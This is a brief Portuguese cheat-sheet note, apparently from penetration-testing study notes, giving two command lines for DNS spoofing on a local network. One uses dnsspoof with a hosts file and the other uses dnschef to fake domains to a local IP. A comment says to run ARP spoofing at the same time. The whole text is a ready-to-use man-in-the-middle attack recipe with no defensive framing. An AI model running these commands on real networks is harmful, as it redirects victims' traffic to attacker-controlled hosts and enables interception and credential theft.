# Criar arquivo hosts.txt:
# IP url.com
# IP url.com

sudo dnsspoof -i [interface] -f arquivo_hosts.txt

# Segunda forma:
sudo dnschef --fakeip [IP local] --fakedomains *.site.com,site.com --port [PORTA] --interface [interface] --nameservers [DNS interno ou 8.8.8.8]

# Ao mesmo tempo, realizar arp spoofing.
